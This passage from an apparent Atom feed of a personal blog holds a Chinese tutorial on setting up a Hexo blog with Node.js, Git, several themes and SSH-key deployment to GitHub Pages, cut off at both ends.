alt="在这里插入图片描述"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：做题遇到的一些RSA脚本&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="https://swhat.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>个人博客搭建历程</title>
    <link href="https://swhat.github.io/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/"/>
    <id>https://swhat.github.io/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/</id>
    <published>2020-02-04T06:59:23.000Z</published>
    <updated>2021-02-03T07:46:47.453Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：使用Hexo+github搭建博客</p> <a id="more"></a>        <h1 id="环境配置"   >          <a href="#环境配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1>      <p>1、hexo<br>2、Node.js<br>3、Git<br>4、GitHub</p>        <h2 id="注册Github和配置"   >          <a href="#注册Github和配置" class="heading-link"><i class="fas fa-link"></i></a><a href="#注册Github和配置" class="headerlink" title="注册Github和配置"></a>注册Github和配置</h2>      <p>官网：<span class="exturl"><a class="exturl__link"   href="https://github.com/" >https://github.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>1.注册账号</strong><br><img   src="https://img-blog.csdnimg.cn/20210131213504600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p><strong>2.新建仓库</strong><br>新建一个储存仓库，username为github用户名</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username.github.io</span><br></pre></td></tr></table></div></figure><p>在主页右上角，点击加号，找到<code>New repository</code>，点进去会显示如下界面，输入仓库名，点击创建</p><p>Repository name格式推荐写成<code>username.github.io</code>,点击Create repository<br><img   src="https://img-blog.csdnimg.cn/20210131214016120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="安装Git"   >          <a href="#安装Git" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2>      <p>下载地址：<span class="exturl"><a class="exturl__link"   href="https://git-scm.com/" >https://git-scm.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>一路next，打开cmd命令行，成功页面如下<br><img   src="https://img-blog.csdnimg.cn/20210131140623911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>打开Git-Bash工具 ，初始化Git</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.配置用户名</span><br><span class="line">git config --global user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line"><span class="comment">#用户名可以不是Github用户名，为了方便，设置一致。</span></span><br><span class="line">2.配置邮箱</span><br><span class="line">git config --global user.email <span class="string">&quot;邮箱地址&quot;</span></span><br><span class="line">3.查看已配置的用户信息</span><br><span class="line">git config --global list</span><br></pre></td></tr></table></div></figure>        <h2 id="安装Node-js"   >          <a href="#安装Node-js" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2>      <p>下载地址：<span class="exturl"><a class="exturl__link"   href="https://nodejs.org/en/" >https://nodejs.org/en/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><img   src="https://img-blog.csdnimg.cn/20210131140950940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>打开cmd，进入文件目录，安装成功如下<br><img   src="https://img-blog.csdnimg.cn/20210131141134259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>为了加快速度，npm换源</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\nodejs&gt;npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">C:\Program Files\nodejs&gt;npm config get registry</span><br><span class="line">https://registry.npm.taobao.org/</span><br></pre></td></tr></table></div></figure>        <h2 id="安装Hexo"   >          <a href="#安装Hexo" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2>      <p>本地安装hexo前，应该先创建一个新文件夹blog</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> f:/hexo</span><br><span class="line"></span><br><span class="line">$ npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">$ hexo init blog</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line"></span><br><span class="line">$ npm install</span><br><span class="line"></span><br><span class="line">$ hexo g <span class="comment"># 或者hexo generate</span></span><br><span class="line"></span><br><span class="line">$ hexo s <span class="comment"># 或者hexo server，可以在http://localhost:4000/ 查看</span></span><br></pre></td></tr></table></div></figure><p>hexo命令</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hexo generate (hexo g) 生成静态文件，会在当前目录下生成一个新的叫做public的文件夹</span><br><span class="line"></span><br><span class="line">hexo server (hexo s) 启动本地web服务，用于博客的预览</span><br><span class="line"></span><br><span class="line">hexo deploy (hexo d) 部署播客到远端（比如github, heroku等平台）</span><br><span class="line"></span><br><span class="line"><span class="variable">$hexo</span> new <span class="string">&quot;postName&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">$ hexo new page <span class="string">&quot;pageName&quot;</span> <span class="comment">#新建页面</span></span><br><span class="line">$ hexo d -g <span class="comment">#生成部署</span></span><br><span class="line">$ hexo s -g <span class="comment">#生成预览</span></span><br></pre></td></tr></table></div></figure><p>本地hexo配置情况</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt;hexo -v</span><br><span class="line">hexo-cli: 4.2.0</span><br><span class="line">os: Windows_NT 10.0.19041 win32 x64</span><br><span class="line">node: 14.15.4</span><br><span class="line">v8: 8.4.371.19-node.17</span><br><span class="line">uv: 1.40.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.9</span><br><span class="line">ares: 1.16.1</span><br><span class="line">modules: 83</span><br><span class="line">nghttp2: 1.41.0</span><br><span class="line">napi: 7</span><br><span class="line">llhttp: 2.1.3</span><br><span class="line">openssl: 1.1.1i</span><br><span class="line">cldr: 37.0</span><br><span class="line">icu: 67.1</span><br><span class="line">tz: 2020a</span><br><span class="line">unicode: 13.0</span><br></pre></td></tr></table></div></figure>        <h1 id="Hexo主题设置"   >          <a href="#Hexo主题设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hexo主题设置" class="headerlink" title="Hexo主题设置"></a>Hexo主题设置</h1>      <p>官方主题推荐：<span class="exturl"><a class="exturl__link"   href="https://hexo.io/themes/" >https://hexo.io/themes/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h2 id="主题1：stun"   >          <a href="#主题1：stun" class="heading-link"><i class="fas fa-link"></i></a><a href="#主题1：stun" class="headerlink" title="主题1：stun"></a>主题1：stun</h2>              <h3 id="安装"   >          <a href="#安装" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装" class="headerlink" title="安装"></a>安装</h3>      <p><span class="exturl"><a class="exturl__link"   href="https://theme-stun.github.io/docs/zh-CN/guide/quick-start.html#%E4%BD%BF%E7%94%A8" >帮助文档</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>在Hexo 根目录下执行</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean  </span><br><span class="line"><span class="comment">#该命令的作用是清除缓存，若不输入此命令，服务器有可能更新不了主题</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/liuyib/hexo-theme-stun.git themes/stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装依赖hexo-renderer-pug</span></span><br><span class="line">$ npm install --save hexo-renderer-pug</span><br></pre></td></tr></table></div></figure>        <h3 id="使用"   >          <a href="#使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用" class="headerlink" title="使用"></a>使用</h3>      <p>修改Hexo目录下的<code>_config.yml</code>配置文件中的theme属性，将默认的<code>landscape改</code>为为<code>black-blue</code>。</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: stun</span><br></pre></td></tr></table></div></figure><p>然后，启动 Hexo 服务器：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></div></figure>        <h3 id="更新"   >          <a href="#更新" class="heading-link"><i class="fas fa-link"></i></a><a href="#更新" class="headerlink" title="更新"></a>更新</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/stun</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></div></figure>        <h3 id="本地效果"   >          <a href="#本地效果" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地效果" class="headerlink" title="本地效果"></a>本地效果</h3>      <p>访问：<span class="exturl"><a class="exturl__link"   href="http://localhost:4000/" >http://localhost:4000/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><img   src="https://img-blog.csdnimg.cn/20210131211931994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h3 id="主题优化"   >          <a href="#主题优化" class="heading-link"><i class="fas fa-link"></i></a><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h3>      <p>安装依赖</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save hexo-render-pug</span><br><span class="line">$ npm install --save hexo-generator-search</span><br><span class="line">$ npm install --save hexo-deployer-git  </span><br></pre></td></tr></table></div></figure><p>1.增加页面导航</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> page categories</span><br><span class="line">$ hexo <span class="keyword">new</span> page tags</span><br></pre></td></tr></table></div></figure><p>在项目目录<code>/source/categories/index.md</code> 加上</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>: categories</span><br></pre></td></tr></table></div></figure><p>在项目目录<code>/source/tags/index.md</code> 加上</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>: tags</span><br></pre></td></tr></table></div></figure><p>修改配置文件</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#展示设置</span></span><br><span class="line">title: &#123;$自定义文字&#125;</span><br><span class="line">language: zh-CN </span><br><span class="line">url: &#123;$博客地址&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#主题</span></span><br><span class="line">theme: stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#git相关</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: </span><br><span class="line">  github: &#123;$你的博客仓库&#125;</span><br><span class="line">  gitee: &#123;$你的博客仓库&#125;</span><br><span class="line">  branch: master</span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索相关</span></span><br><span class="line">search:</span><br><span class="line">  path: search.json</span><br><span class="line">  field: post</span><br><span class="line">  content: <span class="literal">true</span></span><br></pre></td></tr></table></div></figure><p>2.修改部署文件夹下/themes/stun/_config.yml(挑选重要部分修改)</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#取消导航栏注释（注意空格对齐）</span></span><br><span class="line">menu:</span><br><span class="line">  categories: /categories/ || fas fa-layer-group</span><br><span class="line">  tags: /tags/ || fas fa-tags</span><br><span class="line">  </span><br><span class="line"><span class="comment">#更改图标(最好使用链接地址，我这里使用的图床，图床使用见下一篇博客)</span></span><br><span class="line">favicon:</span><br><span class="line">  small: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png</span><br><span class="line">  medium: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改背景大图</span></span><br><span class="line">header:</span><br><span class="line">  bg_image:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">    url: https://gitee.com/BothSavage/PicGo/raw/master/image/背景.png</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改头像大图，并设为圆形</span></span><br><span class="line">author:</span><br><span class="line">  avatar:</span><br><span class="line">    url: https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png</span><br><span class="line">    rounded: <span class="literal">true</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#打开访问统计</span></span><br><span class="line">busuanzi:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#打开搜索功能</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></div></figure>        <h2 id="主题2：black-blue"   >          <a href="#主题2：black-blue" class="heading-link"><i class="fas fa-link"></i></a><a href="#主题2：black-blue" class="headerlink" title="主题2：black-blue"></a>主题2：black-blue</h2>              <h3 id="安装-1"   >          <a href="#安装-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/maochunguang/black-blue.git themes/stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">npm install --save hexo-renderer-jade hexo-renderer-stylus</span><br><span class="line">npm install --save hexo-generator-feed hexo-generator-sitemap hexo-generator-archive hexo-browsersync</span><br></pre></td></tr></table></div></figure>        <h3 id="使用-1"   >          <a href="#使用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3>      <p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: black-blue</span><br></pre></td></tr></table></div></figure><p>保存然后执行命令</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g <span class="comment"># 生成</span></span><br><span class="line">$ hexo s <span class="comment"># 启动本地web服务器</span></span><br></pre></td></tr></table></div></figure>        <h3 id="更新主题"   >          <a href="#更新主题" class="heading-link"><i class="fas fa-link"></i></a><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/black-blue</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></div></figure>        <h2 id="主题3：spfk"   >          <a href="#主题3：spfk" class="heading-link"><i class="fas fa-link"></i></a><a href="#主题3：spfk" class="headerlink" title="主题3：spfk"></a>主题3：spfk</h2>              <h3 id="安装-2"   >          <a href="#安装-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3>      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/luuman/hexo-theme-spfk.git themes/stun</span><br></pre></td></tr></table></div></figure>        <h3 id="使用-2"   >          <a href="#使用-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3>      <p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: black-blue</span><br></pre></td></tr></table></div></figure><p>保存然后执行命令</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g <span class="comment"># 生成</span></span><br><span class="line">$ hexo s <span class="comment"># 启动本地web服务器</span></span><br></pre></td></tr></table></div></figure>        <h3 id="主题优化-1"   >          <a href="#主题优化-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#主题优化-1" class="headerlink" title="主题优化"></a>主题优化</h3>      <p><strong>1.博客个人信息</strong><br>修改Hexo文件夹根目录下的 <code>_config.yml</code> 文件</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#站点标题</span></span><br><span class="line"><span class="number">6</span>| title: Atkx<span class="string">&#x27; blog</span></span><br><span class="line"><span class="string">#作者</span></span><br><span class="line"><span class="string">10| author: Atkx</span></span><br></pre></td></tr></table></div></figure><p><strong>2.头像设置</strong><br>这里修改主题文件夹下的<code>_config.yml</code> 文件</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Link to your avatar |填写头像地址</span></span><br><span class="line"><span class="number">16</span>| avatar: img/atkx_32x32.png</span><br><span class="line"><span class="comment"># Small icon of Your site | 站点小图标地址</span></span><br><span class="line"><span class="number">19</span>| favicon: img/atkx_16x16.png</span><br></pre></td></tr></table></div></figure>        <h1 id="Hexo部署到github"   >          <a href="#Hexo部署到github" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hexo部署到github" class="headerlink" title="Hexo部署到github"></a>Hexo部署到github</h1>              <h2 id="配置github-ssh"   >          <a href="#配置github-ssh" class="heading-link"><i class="fas fa-link"></i></a><a href="#配置github-ssh" class="headerlink" title="配置github ssh"></a>配置github ssh</h2>      <blockquote><p>只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步。</p></blockquote><p>在你第一次新建的文件夹里面，点击 Git Bash Here 输入以下命令：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;你的邮箱&quot;</span></span><br></pre></td></tr></table></div></figure><p>生成一对密钥 SSH key，持续enter。</p><p>在路径<code>C:\Users\admin\.ssh</code>下找到<code>id_rsa.pub</code>，用记事本打开，复制里面的内容。</p><p>配置路径：github 网站–&gt;Settings–&gt;SSH and GPG keys–&gt;NEW SSH KEY ,title随便填写，把上面复制的内容粘贴进Key里面，点击Add SSH key。</p><p><img   src="https://img-blog.csdnimg.cn/20210131144015618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>输入命令检验是否成功。</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi swhat! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></div></figure>        <h2 id="部署文件"   >          <a href="#部署文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#部署文件" class="headerlink" title="部署文件"></a>部署文件</h2>      <p>用sublime打开blog下创建的用户名文件进行部署（将文件直接拖进去就可以了）打开仓库<code>_config.yml</code> 配置文件，</p><p>第16行,更改url</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://swhat.github.io</span><br></pre></td></tr></table></div></figure><p>拉到文件末尾，填上如下配置：</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/swhat/swhat.github.io.git </span><br><span class="line">  <span class="comment">#仓库名字改成自己的</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></div></figure><p><em>若端口冲突，也可以在<code>_config.yml</code>中添加</em></p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 <span class="comment">#端口号随意，默认是4000</span></span><br><span class="line">  compress: <span class="literal">true</span></span><br><span class="line">  header: <span class="literal">true</span></span><br></pre></td></tr></table></div></figure><p>进入你的swhat目录，执行命令</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g -d</span><br></pre></td></tr></table></div></figure><p>会报错</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR Deployer not found: git</span><br></pre></td></tr></table></div></figure><p>安装依赖</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></div></figure><p>重新执行<code>hexo g -d</code>，在弹出的框子中，输入github用户名和密码<br><img   src="https://img-blog.csdnimg.cn/20210131153540546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>命令行也输入github用户名和密码<br><img   src="https://img-blog.csdnimg.cn/20210131210759817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="网站效果"   >          <a href="#网站效果" class="heading-link"><i class="fas fa-link"></i></a><a href="#网站效果" class="headerlink" title="网站效果"></a>网站效果</h2>      <p>访问：<a href="https://swhat.github.io/">https://swhat.github.io</a><br><img   src="https://img-blog.csdnimg.cn/20210131210907129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="发布文章"   >          <a href="#发布文章" class="heading-link"><i class="fas fa-link"></i></a><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h2>      <p>方法一：新建一个空文章，输入以下命令</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo n <span 